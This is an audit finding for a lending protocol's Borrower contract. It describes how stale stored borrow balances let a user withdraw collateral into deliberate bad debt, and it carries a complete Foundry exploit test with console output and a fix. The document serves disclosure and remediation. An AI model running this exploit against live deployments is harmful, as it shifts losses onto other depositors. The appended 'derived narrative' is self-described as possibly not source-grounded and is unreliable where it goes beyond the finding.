---
id: 20363
severity: "High"
---

# Borrower's modify, liquidate and warn functions

## Description

Possible scenario for the intentional creation of bad debt: 1. Borrow max amount at max leverage + some safety margin so that position is healthy for the next few days, for example borrow 10000 DAI, add margin of 1051 DAI for safety (51 DAI required for MAX_LEVERAGE, 1000 DAI safety margin) 2. Wait for a long period of market inactivity (such as 1 day). 3. At this point borrowBalance is greater than borrowBalanceStored by a value higher than MAX_LEVERAGE (example: borrowBalance = 10630 DAI, borrowBalanceStored = 10000 DAI) 4. Call modify and withdraw max possible amount (based on borrowBalanceStored), for example, withdraw 1000 DAI (remaining assets = 10051 DAI, which is healthy based on stored balance of 10000 DAI, but in fact this is already a bad debt, because borrow balance is 10630, which is more than remaining assets). This works, because liabilities used are outdated. At this point the user is already in bad debt, but due to points 1-2, it's still not liquidatable. After calling Lender.accrueInterest the account can be liquidated. This bad debt caused is the funds lost by the other users. This scenario is not profitable to the malicious user, but can be modified to make it profitable: the user can deposit large amount to lender before these steps, meaning the inflated interest rate will be accrued by user's deposit to lender, but it will not be paid by the user due to bad debt (user will deposit 1051 DAI, withdraw 1000 DAI, and gain some share of accrued 630 DAI, for example if he doubles the lender's TVL, he will gain 315 DAI - protocol fees). Malicious user can create bad debt to his account in 1 transaction. Bad debt is the amount not withdrawable from the lender by users who deposited. Since users will know that the lender doesn't have enough assets to pay out to all users, it can cause bank run since first users to withdraw from lender will be able to do so, while those who are the last to withdraw will lose their funds. borrowBalanceStored uses borrowIndex (which is index at last accrual): 
```solidity
// src/Ledger.sol#L226-L232
```
For comparison, borrowBalance uses _previewInterest to get current borrow
```solidity
// src/Ledger.sol#L216-L223
// src/Borrower.sol#L166
// src/Borrower.sol#L211
// src/Borrower.sol#L314
```

## Proof of Concept

The scenario above is demonstrated in the test, create test/Exploit.t.sol:
```solidity
// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.17;
import "forge-std/Test.sol";
import {MAX_RATE, DEFAULT_ANTE, DEFAULT_N_SIGMA, LIQUIDATION_INCENTIVE} from "src/libraries/constants/Constants.sol";
import {Q96} from "src/libraries/constants/Q.sol";
import {zip} from "src/libraries/Positions.sol";
import "src/Borrower.sol";
import "src/Factory.sol";
import "src/Lender.sol";
import "src/RateModel.sol";
import {FatFactory, VolatilityOracleMock} from "./Utils.sol";

contract RateModelMax is IRateModel {
    uint256 private constant _A = 6.1010463348e20;
    uint256 private constant _B = _A / 1e18;
    /// @inheritdoc IRateModel
    function getYieldPerSecond(uint256 utilization, address) external pure returns (uint256) {
        unchecked {
            return (utilization < 0.99e18) ? _A / (1e18 - utilization) - _B : MAX_RATE;
        }
    }
}

contract ExploitTest is Test, IManager, ILiquidator {
    IUniswapV3Pool constant pool = IUniswapV3Pool(0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8);
    ERC20 constant asset0 = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ERC20 constant asset1 = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Lender immutable lender0;
    Lender immutable lender1;
    Borrower immutable account;

    constructor() {
        vm.createSelectFork(vm.rpcUrl("mainnet"));
        vm.rollFork(15_348_451);
        Factory factory = new FatFactory(
            address(0),
            address(0),
            VolatilityOracle(address(new VolatilityOracleMock())),
            new RateModelMax()
        );
        factory.createMarket(pool);
        (lender0, lender1, ) = factory.getMarket(pool);
        account = factory.createBorrower(pool, address(this), bytes12(0));
    }

    function setUp() public {
        // deal to lender and deposit (so that there are assets to borrow)
        deal(address(asset0), address(lender0), 10000e18); // DAI
        deal(address(asset1), address(lender1), 10000e18); // WETH
        lender0.deposit(10000e18, address(12345));
        lender1.deposit(10000e18, address(12345));
        deal(address(account), DEFAULT_ANTE + 1);
    }

    function test_selfLiquidation() public {
        // malicious user borrows at max leverage + some safety margin
        uint256 margin0 = 51e18 + 1000e18;
        uint256 borrows0 = 10000e18;
        deal(address(asset0), address(account), margin0);
        bytes memory data = abi.encode(Action.BORROW, borrows0, 0);
        account.modify(this, data, (1 << 32));
        assertEq(lender0.borrowBalance(address(account)), borrows0);
        assertEq(asset0.balanceOf(address(account)), borrows0 + margin0);
        // skip 1 day (without transactions)
        skip(86400);
        emit log_named_uint("User borrow:", lender0.borrowBalance(address(account)));
        emit log_named_uint("User stored borrow:", lender0.borrowBalanceStored(address(account)));
        // withdraw all the "extra" balance putting account into bad debt
        bytes memory data2 = abi.encode(Action.WITHDRAW, 1000e18, 0);
        account.modify(this, data2, (1 << 32));
        // account is still not liquidatable (because liquidation also uses stored liabilities)
        vm.expectRevert();
        account.warn((1 << 32));
        // make account liquidatable by settling accumulated interest
        lender0.accrueInterest();
        // warn account
        account.warn((1 << 32));
        // skip warning time
        skip(LIQUIDATION_GRACE_PERIOD);
        lender0.accrueInterest();
        // liquidation reverts because it requires asset the account doesn't have to swap
        vm.expectRevert();
        account.liquidate(this, bytes(""), 1, (1 << 32));
        emit log_named_uint("Before liquidation User borrow:", lender0.borrowBalance(address(account)));
        emit log_named_uint("Before liquidation User stored borrow:", lender0.borrowBalanceStored(address(account)));
        emit log_named_uint("Before liquidation User assets:", asset0.balanceOf(address(account)));
        // liquidate with max strain to avoid revert when trying to swap assets account doesn't have
        account.liquidate(this, bytes(""), type(uint256).max, (1 << 32));
        emit log_named_uint("Liquidated User borrow:", lender0.borrowBalance(address(account)));
        emit log_named_uint("Liquidated User assets:", asset0.balanceOf(address(account)));
    }

    enum Action {
        WITHDRAW,
        BORROW,
        UNI_DEPOSIT
    }

    // IManager
    function callback(bytes calldata data, address, uint208) external returns (uint208 positions) {
        require(msg.sender == address(account));
        (Action action, uint256 amount0, uint256 amount1) = abi.decode(data, (Action, uint256, uint256));
        if (action == Action.WITHDRAW) {
            account.transfer(amount0, amount1, address(this));
        } else if (action == Action.BORROW) {
            account.borrow(amount0, amount1, msg.sender);
        } else if (action == Action.UNI_DEPOSIT) {
            account.uniswapDeposit(-75600, -75540, 200000000000000000);
            positions = zip([-75600, -75540, 0, 0, 0, 0]);
        }
    }

    // ILiquidator
    receive() external payable {}

    function swap1For0(bytes calldata data, uint256 actual, uint256 expected0) external {
        /*
        uint256 expected = abi.decode(data, (uint256));
        if (expected == type(uint256).max) {
            Borrower(payable(msg.sender)).liquidate(this, data, 1, (1 << 32));
        }
        assertEq(actual, expected);
        */
        pool.swap(msg.sender, false, -int256(expected0), TickMath.MAX_SQRT_RATIO - 1, bytes(""));
    }

    function swap0For1(bytes calldata data, uint256 actual, uint256 expected1) external {
        /*
        uint256 expected = abi.decode(data, (uint256));
        if (expected == type(uint256).max) {
            Borrower(payable(msg.sender)).liquidate(this, data, 1, (1 << 32));
        }
        assertEq(actual, expected);
        */
        pool.swap(msg.sender, true, -int256(expected1), TickMath.MIN_SQRT_RATIO + 1, bytes(""));
    }

    // IUniswapV3SwapCallback
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        if (amount0Delta > 0) asset0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) asset1.transfer(msg.sender, uint256(amount1Delta));
    }

    // Factory mock
    function getParameters(IUniswapV3Pool) external pure returns (uint248 ante, uint8 nSigma) {
        ante = DEFAULT_ANTE;
        nSigma = DEFAULT_N_SIGMA;
    }

    // (helpers)
    function _setInterest(Lender lender, uint256 amount) private {
        bytes32 ID = bytes32(uint256(1));
        uint256 slot1 = uint256(vm.load(address(lender), ID));
        uint256 borrowBase = slot1 % (1 << 184);
        uint256 borrowIndex = slot1 >> 184;
        uint256 newSlot1 = borrowBase + (((borrowIndex * amount) / 10_000) << 184);
        vm.store(address(lender), ID, bytes32(newSlot1));
    }
}
```
Execution console log:
User borrow:: 10629296791890000000000
User stored borrow:: 10000000000000000000000
Before liquidation User borrow:: 10630197795010000000000
Before liquidation User stored borrow:: 10630197795010000000000
Before liquidation User assets:: 10051000000000000000000
Liquidated User borrow:: 579197795010000000001
Liquidated User assets:: 0
As can be seen, in the end user debt is 579 DAI with 0 assets.

## Recommendation

Consider using borrowBalance instead of borrowBalanceStored in _getLiabilities().

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an accounting mismatch that allows a borrower to create unrepayable debt by exploiting the fact that the contract uses a stale value (borrowBalanceStored) to calculate liabilities in the modify, liquidate and warn functions. The stored borrow balance is only updated during an explicit accrueInterest call and therefore reflects the debt at the last interest accrual, while the current borrow balance (borrowBalance) includes interest that has accrued since then. A malicious user can borrow the maximum amount allowed at the highest leverage, add a small safety margin, and then wait for a period of market inactivity during which interest accrues. After this idle period the actual borrow balance exceeds the stored balance by more than the allowed leverage. Because the contract still bases collateral checks and withdrawal limits on the outdated stored balance, the attacker can withdraw assets that appear to be safely collateralised but are in fact insufficient to cover the real debt. The account remains apparently healthy and is not liquidatable because liquidation also relies on the stored liabilities. Once the attacker triggers an explicit accrueInterest on the lender, the stored balance catches up to the real debt, the account becomes liquidatable and a liquidation can be performed, leaving the borrower with a large residual debt and zero assets. The protocol’s other users suffer because the bad debt reduces the lender’s total assets, meaning that later depositors may be unable to withdraw their funds, potentially causing a bank‑run scenario. The issue was discovered during an audit by reproducing the exploit in a test contract (Exploit.t.sol) that demonstrates the sequence of borrowing, waiting, withdrawing, and forced liquidation. It is hard to notice because the UI and on‑chain queries that read borrowBalanceStored report a healthy collateralisation ratio, and the warning mechanisms also use the stale value, so no alert is raised until interest is manually accrued. The root cause is the reliance on borrowBalanceStored in the internal _getLiabilities routine instead of the up‑to‑date borrowBalance that incorporates accrued interest. The recommended remediation is to replace borrowBalanceStored with borrowBalance when computing liabilities, ensuring that all collateral checks, withdrawals, warnings and liquidations use the current debt figure. This class of bug falls under stale‑state or accounting‑mismatch vulnerabilities that break the invariant that assets must always cover liabilities, leading to unexpected fund loss and violation of the protocol’s financial guarantees.
